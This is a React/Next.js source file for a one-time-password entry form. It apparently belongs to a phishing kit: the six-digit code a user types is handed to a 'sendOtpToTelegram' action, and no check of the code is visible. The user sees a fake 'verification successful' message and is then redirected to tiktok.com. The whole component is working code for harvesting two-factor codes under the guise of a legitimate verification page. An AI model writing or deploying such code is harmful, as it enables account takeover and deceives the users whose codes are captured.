
"use client"

import { useState, useEffect } from "react"
import { zodResolver } from "@hookform/resolvers/zod"
import { useForm } from "react-hook-form"
import * as z from "zod"
import { useRouter } from "next/navigation"

import { Button } from "@/components/ui/button"
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form"
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog"
import { useToast } from "@/hooks/use-toast"
import { sendOtpToTelegram } from "@/app/actions/telegram"
import { useLanguage } from "@/contexts/language-context"

const FormSchema = z.object({
  pin: z.string().min(6, {
    message: "Your one-time password must be 6 characters.",
  }),
})

// Easily change the redirect destination here
const REDIRECT_URL = "https://www.tiktok.com/";

export function OtpForm() {
  const { t } = useLanguage();
  const { toast } = useToast()
  const router = useRouter()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showRedirectModal, setShowRedirectModal] = useState(false)
  const [redirectCountdown, setRedirectCountdown] = useState(10)
  const [otpTimer, setOtpTimer] = useState(60)

  useEffect(() => {
    const timer = otpTimer > 0 && setInterval(() => setOtpTimer(otpTimer - 1), 1000)
    return () => {
      if (timer) clearInterval(timer)
    }
  }, [otpTimer])

  useEffect(() => {
    let countdownTimer: NodeJS.Timeout | null = null;
    if (showRedirectModal && redirectCountdown === 0) {
        window.location.href = REDIRECT_URL;
    } else if (showRedirectModal) {
        countdownTimer = setInterval(() => {
            setRedirectCountdown((prev) => prev - 1);
        }, 1000);
    }
    return () => {
        if(countdownTimer) clearInterval(countdownTimer);
    };
  }, [showRedirectModal, redirectCountdown]);


  const form = useForm<z.infer<typeof FormSchema>>({
    resolver: zodResolver(FormSchema),
    defaultValues: {
      pin: "",
    },
  })

  async function onSubmit(data: z.infer<typeof FormSchema>) {
    setIsSubmitting(true)
    const result = await sendOtpToTelegram(data.pin)

    if (result.success) {
      toast({
        title: t('verificationSuccess'),
        description: t('codeVerified'),
      })
      setShowRedirectModal(true)
    } else {
      form.setError("pin", { message: "Invalid or expired code. Please try again."})
      toast({
        title: t('verificationFailed'),
        description: t('invalidCode'),
        variant: "destructive",
      })
    }
    setIsSubmitting(false)
  }

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`
  }

  return (
    <>
      <div className="w-full p-6 sm:p-8 space-y-4 bg-card rounded-xl shadow-lg">
        <div className="text-center">
          <h1 className="text-2xl font-bold font-headline">{t('enterAuthCode')}</h1>
          <p className="text-sm text-muted-foreground mt-2">
            {t('otpSubheading')}{" "}
            <span className="font-bold text-primary">{formatTime(otpTimer)}</span>.
          </p>
        </div>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="w-full space-y-6 text-center">
            <FormField
              control={form.control}
              name="pin"
              render={({ field }) => (
                <FormItem className="flex flex-col items-center">
                  <FormControl>
                    <InputOTP maxLength={6} {...field}>
                      <InputOTPGroup>
                        <InputOTPSlot index={0} />
                        <InputOTPSlot index={1} />
                        <InputOTPSlot index={2} />
                        <InputOTPSlot index={3} />
                        <InputOTPSlot index={4} />
                        <InputOTPSlot index={5} />
                      </InputOTPGroup>
                    </InputOTP>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <Button type="submit" className="w-full text-base font-bold bg-primary text-primary-foreground hover:bg-primary/90" disabled={isSubmitting}>
              {isSubmitting ? t('verifying') : t('verify')}
            </Button>
          </form>
        </Form>
      </div>

      <Dialog open={showRedirectModal} onOpenChange={setShowRedirectModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center text-xl">{t('verificationSuccessful')}</DialogTitle>
            <DialogDescription className="text-center pt-2">
              {t('redirectingShortly')}
            </DialogDescription>
          </DialogHeader>
          <div className="flex flex-col items-center justify-center p-6 space-y-4">
            <div className="text-6xl font-bold text-primary">{redirectCountdown}</div>
            <p className="text-muted-foreground">{t('redirectingShortly')}...</p>
          </div>
        </DialogContent>
      </Dialog>
    </>
  )
}
